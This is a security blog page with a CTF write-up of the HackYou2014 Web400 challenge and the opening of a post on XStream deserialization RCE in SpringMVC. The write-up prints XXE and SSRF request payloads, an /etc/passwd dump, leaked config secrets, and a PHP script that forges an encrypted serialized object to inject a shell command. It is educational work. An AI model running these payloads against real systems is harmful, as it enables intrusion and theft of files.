

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>RCE - Page 1 - &lt;/pwntester&gt;</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/tag/rce39/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="&lt;/pwntester&gt;">
    <meta property="og:type" content="website">
    <meta property="og:title" content="RCE - Page 1 - &lt;/pwntester&gt;">
    <meta property="og:url" content="http://www.pwntester.com/tag/rce39/">
    <meta property="article:modified_time" content="2014-05-04T16:31:52.000Z">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="RCE - Page 1 - &lt;/pwntester&gt;">
    <meta name="twitter:url" content="http://www.pwntester.com/tag/rce39/">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Series",
    "publisher": {
        "@type": "Organization",
        "name": "&lt;/pwntester&gt;",
        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
    },
    "url": "http://www.pwntester.com/tag/rce39/",
    "name": "RCE",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://www.pwntester.com"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="tag-template tag-rce39">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        

<header class="tag-archive-header">
    <h4><i class="fa fa-tag"></i><span class="tag-archive-header-name">RCE</span></h4>
</header>


<article class="post tag-xxe tag-rce39 tag-ctf tag-php tag-hackyou201458 tag-ssrf">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-17">17 Jan 2014</time> on <a href="../xxe/">XXE</a>, <a href="index.html">RCE</a>, <a href="../ctf/">CTF</a>, <a href="../php/">PHP</a>, <a href="../hackyou201458/">HackYou2014</a>, <a href="../ssrf/">SSRF</a></span>
        <h2 class="post-title"><a href="../../blog/2014/01/17/hackyou2014-web400-write-up/">#hackyou2014 Web400 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>I did not solve this <a href="http://hackyou2014tasks.ctf.su:40080/">level</a> during the CTF, but found it so interesting reading <a href="https://twitter.com/Xelenonz">Xelenonz</a> <a href="http://blog.rop.sh/hackyou2014-phpwning-web400/">write-up</a> that I couldnt help trying it myself just for the fun and since this blog is my personal notes, I decided to write it here for future reference, but all credits go to <a href="https://twitter.com/Xelenonz">Xelenonz</a>.</p>

<p>We are given the <a href="http://hackyou.ctf.su/files/web400.zip">code</a> of a Image hostig web app. Reading the code we see how it handle the requests:</p>

<pre><code class="language-lang-php line-numbers data-line=6 ">include 'config.php';  
include 'classes.php';  
$action = (isset($_REQUEST['action'])) ? $_REQUEST['action'] : 'View';
$param = (isset($_REQUEST['param'])) ? $_REQUEST['param'] : 'index';
$page = new $action($param);
echo $page;  
</code></pre>

<p>So <strong>action</strong> is used to instantiate any arbitrary class and <strong>param</strong> is the argument for the constructor. Cool. We are given a bunch of classes the application uses to upload and view images and to manage the Session object:</p>

<pre><code class="language-lang-php line-numbers ">class View {  
    function __construct($page) {
        ob_start();
        readfile('html/header.html');
        switch ($page) {
            case 'index':
                readfile('html/index.tpl.html');
                break;
            case 'upload':
                readfile('html/upload.tpl.html');
                break;
        }
        readfile('html/footer.html');
    }
    function __toString() {
        $this-&gt;content = ob_get_contents();
        ob_end_clean();
        return $this-&gt;content;
    }
}

class Upload {  
    function __construct($data) {
        global $config;
        $this-&gt;data = base64_decode($data);
        $this-&gt;filename = md5(uniqid(rand(), true));
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
        file_put_contents($this-&gt;path, $this-&gt;data);
        $this-&gt;type = exif_imagetype($this-&gt;path);
    }
    function __toString() {
        if ($this-&gt;type) {
            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href="'.$link.'"&gt;'.$link.'&lt;/a&gt;';
        } else {
            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
        }
    }
    function __destruct() {
        if ($this-&gt;type) {
            echo '&lt;p&gt;Some file info:

{gfm-js-extract-pre-1}&lt;/p&gt;';
        } else {
            unlink($this-&gt;path);
        }
    }
}

class Image {  
    function __construct($filename) {
        global $config;
        $this-&gt;filename = $filename;
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
    }
    function __toString() {
        if (preg_match('/^[a-f0-9]{32}$/', $this-&gt;filename) &amp;&amp; file_exists($this-&gt;path)) {
            $this-&gt;type = exif_imagetype($this-&gt;path);
            $this-&gt;mime = image_type_to_mime_type($this-&gt;type);
            header('Content-Type: '.$this-&gt;mime);
            return file_get_contents($this-&gt;path);
        } else {
            return '&lt;h1&gt;Error&lt;/h1&gt;';
        }
    }
}

class Session {  
    function __construct() {
        global $config;
        session_set_save_handler(
            array($this, "open"), array($this, "close"),  array($this, "read"),
            array($this, "write"),array($this, "destroy"),array($this, "gc")
        );
        $this-&gt;key = $config['key'];
        $this-&gt;size = 32;
        $this-&gt;path = '/tmp';
    }

    function encrypt($data) {
        $iv = mcrypt_create_iv($this-&gt;size, MCRYPT_RAND);
        $key = hash('sha256', $this-&gt;key, true);
        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
    }

    function decrypt($data) {
        $key = hash('sha256', $this-&gt;key, true);
        $iv = substr($data, 0, $this-&gt;size);
        $data = substr($data, $this-&gt;size);
        $data = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
    }

    function write($id, $data) {
        $path = $this-&gt;path.'/'.$id;
        $data = $this-&gt;encrypt($data);
        file_put_contents($path, $data);
    }

    function read($id) {
        $path = $this-&gt;path.'/'.$id;
        $data = null;
        if (is_file($path)) {
            $data = file_get_contents($path);
            $data = $this-&gt;decrypt($data);
        }
        return $data;
    }

    function open($sess_path, $sess_id) {
        //nothing
    }

    function close() {
        return true;
    }

    function gc($maxlifetime) {
        $path = $this-&gt;path.'/*';
        foreach (glob($path) as $file) {
            if (filemtime($file) + $maxlifetime &lt; time() &amp;&amp; file_exists($file)) {
                unlink($file);
            }
        }
        return true;
    }

    function destroy($id) {
        $path = $this-&gt;path.'/'.$id;
        if (is_file($path)) {
            unlink($path);
        }
        return true;
    }
}
</code></pre>

<p>The most interesting one are the <strong>Upload</strong> class whose destructor runs "arbitrary code" and <strong>Session</strong> which tell us how the Session object is initializated and stored/read from disk (although, we dont know the encryption key that is stored in the config.php file). These are classes are interesting but not useful if we can only create an instance and print the instance tostring return value. Lets look for PHP system classes that could be more useful:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~&gt; php -r 'var_dump (get_declared_classes ());'  
array(139) {  
  [0]=&gt; string(8) "stdClass"
  [1]=&gt; string(9) "Exception"
  [2]=&gt; string(14) "ErrorException"
  [3]=&gt; string(7) "Closure"
  [4]=&gt; string(8) "DateTime"
  [5]=&gt; string(12) "DateTimeZone"
  [6]=&gt; string(12) "DateInterval"
  [7]=&gt; string(10) "DatePeriod"
  [8]=&gt; string(11) "LibXMLError"
  [9]=&gt; string(7) "SQLite3"
  [10]=&gt; string(11) "SQLite3Stmt"
  [11]=&gt; string(13) "SQLite3Result"
  [12]=&gt; string(12) "DOMException"
  [13]=&gt; string(13) "DOMStringList"
  [14]=&gt; string(11) "DOMNameList"
  [15]=&gt; string(21) "DOMImplementationList"
  [16]=&gt; string(23) "DOMImplementationSource"
  [17]=&gt; string(17) "DOMImplementation"
  [18]=&gt; string(7) "DOMNode"
  [19]=&gt; string(16) "DOMNameSpaceNode"
  [20]=&gt; string(19) "DOMDocumentFragment"
  [21]=&gt; string(11) "DOMDocument"
  [22]=&gt; string(11) "DOMNodeList"
  [23]=&gt; string(15) "DOMNamedNodeMap"
  [24]=&gt; string(16) "DOMCharacterData"
  [25]=&gt; string(7) "DOMAttr"
  [26]=&gt; string(10) "DOMElement"
  [27]=&gt; string(7) "DOMText"
  [28]=&gt; string(10) "DOMComment"
  [29]=&gt; string(11) "DOMTypeinfo"
  [30]=&gt; string(18) "DOMUserDataHandler"
  [31]=&gt; string(11) "DOMDomError"
  [32]=&gt; string(15) "DOMErrorHandler"
  [33]=&gt; string(10) "DOMLocator"
  [34]=&gt; string(16) "DOMConfiguration"
  [35]=&gt; string(15) "DOMCdataSection"
  [36]=&gt; string(15) "DOMDocumentType"
  [37]=&gt; string(11) "DOMNotation"
  [38]=&gt; string(9) "DOMEntity"
  [39]=&gt; string(18) "DOMEntityReference"
  [40]=&gt; string(24) "DOMProcessingInstruction"
  [41]=&gt; string(15) "DOMStringExtend"
  [42]=&gt; string(8) "DOMXPath"
  [43]=&gt; string(5) "finfo"
  [44]=&gt; string(14) "LogicException"
  [45]=&gt; string(24) "BadFunctionCallException"
  [46]=&gt; string(22) "BadMethodCallException"
  [47]=&gt; string(15) "DomainException"
  [48]=&gt; string(24) "InvalidArgumentException"
  [49]=&gt; string(15) "LengthException"
  [50]=&gt; string(19) "OutOfRangeException"
  [51]=&gt; string(16) "RuntimeException"
  [52]=&gt; string(20) "OutOfBoundsException"
  [53]=&gt; string(17) "OverflowException"
  [54]=&gt; string(14) "RangeException"
  [55]=&gt; string(18) "UnderflowException"
  [56]=&gt; string(24) "UnexpectedValueException"
  [57]=&gt; string(25) "RecursiveIteratorIterator"
  [58]=&gt; string(16) "IteratorIterator"
  [59]=&gt; string(14) "FilterIterator"
  [60]=&gt; string(23) "RecursiveFilterIterator"
  [61]=&gt; string(22) "CallbackFilterIterator"
  [62]=&gt; string(31) "RecursiveCallbackFilterIterator"
  [63]=&gt; string(14) "ParentIterator"
  [64]=&gt; string(13) "LimitIterator"
  [65]=&gt; string(15) "CachingIterator"
  [66]=&gt; string(24) "RecursiveCachingIterator"
  [67]=&gt; string(16) "NoRewindIterator"
  [68]=&gt; string(14) "AppendIterator"
  [69]=&gt; string(16) "InfiniteIterator"
  [70]=&gt; string(13) "RegexIterator"
  [71]=&gt; string(22) "RecursiveRegexIterator"
  [72]=&gt; string(13) "EmptyIterator"
  [73]=&gt; string(21) "RecursiveTreeIterator"
  [74]=&gt; string(11) "ArrayObject"
  [75]=&gt; string(13) "ArrayIterator"
  [76]=&gt; string(22) "RecursiveArrayIterator"
  [77]=&gt; string(11) "SplFileInfo"
  [78]=&gt; string(17) "DirectoryIterator"
  [79]=&gt; string(18) "FilesystemIterator"
  [80]=&gt; string(26) "RecursiveDirectoryIterator"
  [81]=&gt; string(12) "GlobIterator"
  [82]=&gt; string(13) "SplFileObject"
  [83]=&gt; string(17) "SplTempFileObject"
  [84]=&gt; string(19) "SplDoublyLinkedList"
  [85]=&gt; string(8) "SplQueue"
  [86]=&gt; string(8) "SplStack"
  [87]=&gt; string(7) "SplHeap"
  [88]=&gt; string(10) "SplMinHeap"
  [89]=&gt; string(10) "SplMaxHeap"
  [90]=&gt; string(16) "SplPriorityQueue"
  [91]=&gt; string(13) "SplFixedArray"
  [92]=&gt; string(16) "SplObjectStorage"
  [93]=&gt; string(16) "MultipleIterator"
  [94]=&gt; string(14) "SessionHandler"
  [95]=&gt; string(22) "__PHP_Incomplete_Class"
  [96]=&gt; string(15) "php_user_filter"
  [97]=&gt; string(9) "Directory"
  [98]=&gt; string(20) "mysqli_sql_exception"
  [99]=&gt; string(13) "mysqli_driver"
  [100]=&gt; string(6) "mysqli"
  [101]=&gt; string(14) "mysqli_warning"
  [102]=&gt; string(13) "mysqli_result"
  [103]=&gt; string(11) "mysqli_stmt"
  [104]=&gt; string(12) "PDOException"
  [105]=&gt; string(3) "PDO"
  [106]=&gt; string(12) "PDOStatement"
  [107]=&gt; string(6) "PDORow"
  [108]=&gt; string(13) "PharException"
  [109]=&gt; string(4) "Phar"
  [110]=&gt; string(8) "PharData"
  [111]=&gt; string(12) "PharFileInfo"
  [112]=&gt; string(19) "ReflectionException"
  [113]=&gt; string(10) "Reflection"
  [114]=&gt; string(26) "ReflectionFunctionAbstract"
  [115]=&gt; string(18) "ReflectionFunction"
  [116]=&gt; string(19) "ReflectionParameter"
  [117]=&gt; string(16) "ReflectionMethod"
  [118]=&gt; string(15) "ReflectionClass"
  [119]=&gt; string(16) "ReflectionObject"
  [120]=&gt; string(18) "ReflectionProperty"
  [121]=&gt; string(19) "ReflectionExtension"
  [122]=&gt; string(23) "ReflectionZendExtension"
  [123]=&gt; string(16) "SimpleXMLElement"
  [124]=&gt; string(17) "SimpleXMLIterator"
  [125]=&gt; string(4) "SNMP"
  [126]=&gt; string(13) "SNMPException"
  [127]=&gt; string(10) "SoapClient"
  [128]=&gt; string(7) "SoapVar"
  [129]=&gt; string(10) "SoapServer"
  [130]=&gt; string(9) "SoapFault"
  [131]=&gt; string(9) "SoapParam"
  [132]=&gt; string(10) "SoapHeader"
  [133]=&gt; string(4) "tidy"
  [134]=&gt; string(8) "tidyNode"
  [135]=&gt; string(9) "XMLReader"
  [136]=&gt; string(9) "XMLWriter"
  [137]=&gt; string(13) "XSLTProcessor"
  [138]=&gt; string(10) "ZipArchive"
}
</code></pre>

<p>That's a bunch of classes but going through them we find two that are particulary interest: "SplFileObject" and "SimpleXmlElement". <br>
With SplFileObject we are returned the first line of any file:</p>

<p><img src="../../content/images/octopress/web400-0.png" alt=""></p>

<p>You can however, use PHP filters to encode it base64 and get all file contents as a long base64 line:</p>

<p><img src="../../content/images/octopress/web400-1.png" alt=""></p>

<p>Thats pretty cool, now we can decode it and get the key:</p>

<pre><code class="language-lang-php line-numbers ">$config = array();
$config['root'] = '/var/www/';
$config['key'] = '6hQJMFh8gRje67EmpDX3';
$config['IP'] = array('127.0.0.1');
$config['password'] = '3fd5b6db6bc90ddd6a6f6caad27d8b00';
</code></pre>

<p>And thats basically as far as I got, I could not bypass the restriction in the "admin.php" to allow only requests from localhost so I could not start the session and try to take advantage of it.</p>

<p>After the CTF ended I found out that we could submit XML documents with external entities and launch a SSRF attack from there. Lets see how. <br>
We can use the "SimpleXMLElement" class to create XML documents like:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 21

param=&lt;foo&gt;test&lt;/foo&gt;  
</code></pre>

<p><img src="../../content/images/octopress/web400-2.png" alt=""></p>

<p>Actually I tried this during the CTF but forgot to add the "Content-Type" header so kept on getting "Internal Server Errors", damn!</p>

<p>Anyway, The server returns us our XML document so now we can try to inject external entities:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 76

param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "/etc/passwd" &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Date: Fri, 17 Jan 2014 13:49:12 GMT  
Server: Apache/2.2.22 (Ubuntu)  
X-Powered-By: PHP/5.3.10-1ubuntu3.8  
Vary: Accept-Encoding  
Content-Length: 1041  
Keep-Alive: timeout=5, max=100  
Connection: Keep-Alive  
Content-Type: text/html

root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/bin/sh  
bin:x:2:2:bin:/bin:/bin/sh  
sys:x:3:3:sys:/dev:/bin/sh  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/bin/sh  
man:x:6:12:man:/var/cache/man:/bin/sh  
lp:x:7:7:lp:/var/spool/lpd:/bin/sh  
mail:x:8:8:mail:/var/mail:/bin/sh  
news:x:9:9:news:/var/spool/news:/bin/sh  
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh  
proxy:x:13:13:proxy:/bin:/bin/sh  
www-data:x:33:33:www-data:/var/www:/bin/sh  
backup:x:34:34:backup:/var/backups:/bin/sh  
list:x:38:38:Mailing List Manager:/var/list:/bin/sh  
irc:x:39:39:ircd:/var/run/ircd:/bin/sh  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh  
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh  
libuuid:x:100:101::/var/lib/libuuid:/bin/sh  
syslog:x:101:103::/home/syslog:/bin/false  
messagebus:x:102:105::/var/run/dbus:/bin/false  
whoopsie:x:103:106::/nonexistent:/bin/false  
landscape:x:104:109::/var/lib/landscape:/bin/false  
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin  
user:x:1000:1000:user,,,:/home/user:/bin/bash  
</code></pre>

<p>The nice thing about this XXE vulnerability is not that we can read any file (that we already could using the SplFileObject class) but that we can use to initiate requests from the own server!</p>

<p>Now we can bypass localhost address restriction, however accessing <a href="http://locahost/admin.php">http://locahost/admin.php</a> returns some characters that break the XML schema so we will use the PHP base64 encoder filter to return an XML schema friendly version of the page:</p>

<pre><code class="language-lang-bash line-numbers ">POST /index.php?action=SimpleXMLElement HTTP/1.1  
Host: hackyou2014tasks.ctf.su:40080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0  
Content-Type: application/x-www-form-urlencoded;application/xml  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-us,es-es;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Connection: keep-alive  
Content-Length: 140

param=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/admin.php" &gt;]&gt;&lt;foo&gt;%26xxe;&lt;/foo&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Date: Fri, 17 Jan 2014 13:51:57 GMT  
Server: Apache/2.2.22 (Ubuntu)  
X-Powered-By: PHP/5.3.10-1ubuntu3.8  
Vary: Accept-Encoding  
Content-Length: 256  
Keep-Alive: timeout=5, max=100  
Connection: Keep-Alive  
Content-Type: text/html

PGh0bWw+Cjxib2R5PgoJPGI+RW50ZXIgcGFzc3dvcmQ6PC9iPgoJPGZvcm0gYWN0aW9uPSJhZG1pbi5waHAiIG1ldGhvZD0iUE9TVCI+CgkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3N3b3JkIj4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJHTyI+Cgk8L2Zvcm0+CjwvYm9keT4KPC9odG1sPgo=  
</code></pre>

<p>That decodes into:</p>

<pre><code class="language-lang-html line-numbers ">&lt;html&gt;  
&lt;body&gt;  
    &lt;b&gt;Enter password:&lt;/b&gt;
    &lt;form action="admin.php" method="POST"&gt;
        &lt;input type="text" name="password"&gt;
        &lt;input type="submit" name="submit" value="GO"&gt;
    &lt;/form&gt;
&lt;/body&gt;  
&lt;/html&gt;  
</code></pre>

<p>Now, I dont really need to become admin since right after the local IP check, the Session is initialized:</p>

<pre><code class="language-lang-php line-numbers ">if (!in_array($_SERVER['REMOTE_ADDR'], $config['IP']))  
    die('&lt;h1&gt;Access denied&lt;/h1&gt;');

$handler = new Session();
session_start();  
</code></pre>

<p>So <strong>session_start()</strong> will call the session handler <strong>open()</strong> and <strong>read()</strong> methods to restore the session. If we look at our custom Session handler we see that the serialized session is read from /tmp/&lt;phpsessionid&gt;:</p>

<pre><code class="language-lang-php line-numbers data-line=9,16-17 ">function __construct() {  
    global $config;
    session_set_save_handler(
        array($this, "open"), array($this, "close"),  array($this, "read"),
        array($this, "write"),array($this, "destroy"),array($this, "gc")
    );
    $this-&gt;key = $config['key'];
    $this-&gt;size = 32;
    $this-&gt;path = '/tmp';
}

function read($id) {  
    $path = $this-&gt;path.'/'.$id;
    $data = null;
    if (is_file($path)) {
        $data = file_get_contents($path);
        $data = $this-&gt;decrypt($data);
    }
    return $data;
}
</code></pre>

<p>And since we can control PHPSESSIONID by sending it as a query parameter using the SSRF attack, we can point the <strong>read()</strong> method to a different file. Luckly for us we can upload images to /var/www/images right?? so if we make:</p>

<pre><code class="language-lang-bash line-numbers ">PHPSESSIONID=../var/www/images/&lt;image under control&gt;  
</code></pre>

<p>We will fool the application to read the session from our file. All we have to do now is uploading an image that is an encrypted version of a serialized session containing any arbitrary objects we want to store there.</p>

<p>Here its where the <strong>Upload</strong> class come really handy since its destructor can execute any command if we control the $this-path variable which we do:</p>

<pre><code class="language-lang-php line-numbers ">class Upload {  
    function __construct($data) {
        global $config;
        $this-&gt;data = base64_decode($data);
        $this-&gt;filename = md5(uniqid(rand(), true));
        $this-&gt;path = $config['root'].'images/'.$this-&gt;filename;
        file_put_contents($this-&gt;path, $this-&gt;data);
        $this-&gt;type = exif_imagetype($this-&gt;path);
    }
    function __toString() {
        if ($this-&gt;type) {
            $link = 'http://'.$_SERVER['SERVER_NAME'].'/'.$this-&gt;filename;
            return '&lt;p&gt;Successfully updated!&lt;/p&gt;Your link: &lt;a href="'.$link.'"&gt;'.$link.'&lt;/a&gt;';
        } else {
            return '&lt;p&gt;Wrong file type!&lt;p&gt;';
        }
    }
    function __destruct() {
        if ($this-&gt;type) {
            echo '&lt;p&gt;Some file info:

{gfm-js-extract-pre-2}&lt;/p&gt;';
        } else {
            unlink($this-&gt;path);
        }
    }
}
</code></pre>

<p>So we can craft a session object containing an instance of a hand crafted <strong>Upolad*</strong> class and assign it to $_SESSION['auth'] (so the welcome message is printed).</p>

<p>Also, if we want to obtain our exploit "image" hash to craft the PHPSESSIONID, we need our exploit to have "$this-&gt;type &gt; 0" and for that we need <strong>exif_imagetype()</strong> to return a value bigger than 0. So our exploit will be generated with the following script that will run "ls /" when the Upload instance is destroyed. PHP 5 introduced a destructor concept similar to that of other object-oriented languages, such as C++. The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence.</p>

<pre><code class="language-lang-php line-numbers ">class Upload {  
    function __construct($path) {
        $this-&gt;data = "";
        $this-&gt;filename = "";
        $this-&gt;path = $path;
        $this-&gt;type = "image/jpeg";
    }
}

function encrypt($data) {  
        $size = 32;
        $key = '6hQJMFh8gRje67EmpDX3';
        $iv = mcrypt_create_iv($size, MCRYPT_RAND);
        $key = hash('sha256', $key, true);
        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
}

$upload = new Upload("img; ls /");
$payload = 'auth|'.serialize($upload);
$data = '';
$file = 0;
while (true){  
    echo '.';
    $data = encrypt($payload);
    file_put_contents("exploit",$data);
    $file = exif_imagetype('exploit');
    if($file &gt; 0){
        echo $file."\n";
        die("Done\n");
    };
};
</code></pre>

<p>Now our exploit will be accepted:</p>

<p><img src="../../content/images/octopress/web400-3.png" alt=""></p>

<p>All we are left to do is use our SSRF vector to visit the admin.php page for us and make it set the PHPSESSIONID in the query parameter:</p>

<p><img src="../../content/images/octopress/web400-4.png" alt=""></p>

<p>If we decode the response:</p>

<p><img src="../../content/images/octopress/web400-5.png" alt=""></p>

<p>The flag was:</p>

<pre><code class="language-lang-bash line-numbers ">CTF{42a38432d46b9054004a7a87fd3140c7}  
</code></pre>
    </section>
</article>


<article class="post tag-springmvc10 tag-java tag-rce39 tag-xstream">
    <header class="post-header">
        <span class="post-meta"><time datetime="2013-12-24">24 Dec 2013</time> on <a href="../springmvc10/">SpringMVC</a>, <a href="../java/">Java</a>, <a href="index.html">RCE</a>, <a href="../xstream/">XStream</a></span>
        <h2 class="post-title"><a href="../../blog/2013/12/24/more-on-xstream-rce-springmvc-ws/">More on XStream RCE: SpringMVC WS</a></h2>

    </header>
    <section class="post-content">
        <p>Continuing my previous post where I mentioned that the <a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization/">XStream RCE issue</a> issue also affected SpringMVC RESTful WebServices using the XStream SpringOXM wrapper, I  wanted to share a POC server. The code is quite simple and can be found in the <a href="https://github.com/pwntester/XStreamServer">XStreamServer GitHub Repo</a>. It contains a WebService defined by the <strong>ContactController</strong>:</p>

<pre><code class="language-lang-java line-numbers ">@Controller
@RequestMapping("/contacts")
public class ContactController {

    @Autowired
    private ContactRepository contactRepository;

    @RequestMapping( value = "/{id}", method = RequestMethod.GET )
    @ResponseStatus(HttpStatus.OK)
    @ResponseBody
    public final Contact get( @PathVariable( "id" ) final Long contactId ){
        System.out.println("get");
        return contactRepository.findOne(contactId);
    }

    @RequestMapping( method = RequestMethod.POST )
    @ResponseStatus( HttpStatus.CREATED )
    @ResponseBody
    public final String create( @RequestBody final Contact contact ){
        System.out.println("Contact name: " + contact.getFirstName());
        contactRepository.save((ContactImpl) contact);
        return "OK";
    }
}
</code></pre>

<p>The <strong>create</strong> method binds an incoming XML message with a <strong>Contact</strong> instance. This application is configured to use <strong>XStream</strong> as its binding library as shown here:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;!-- Marshaller configuration --&gt;  
&lt;bean id="marshallingHttpMessageConverter" class="org.springframework.http.converter.xml.MarshallingHttpMessageConverter"&gt;  
    &lt;property name="marshaller" ref="xstreamMarshaller"/&gt;
    &lt;property name="unmarshaller" ref="xstreamMarshaller"/&gt;
&lt;/bean&gt;

&lt;bean id="xstreamMarshaller" class="org.springframework.oxm.xstream.XStreamMarshaller"&gt;  
    &lt;property name="aliases"&gt;
        &lt;props&gt;
            &lt;prop key="contact"&gt;org.pwntester.springserver.ContactImpl&lt;/prop&gt;
        &lt;/props&gt;
    &lt;/property&gt;
&lt;/bean&gt;  
</code></pre>

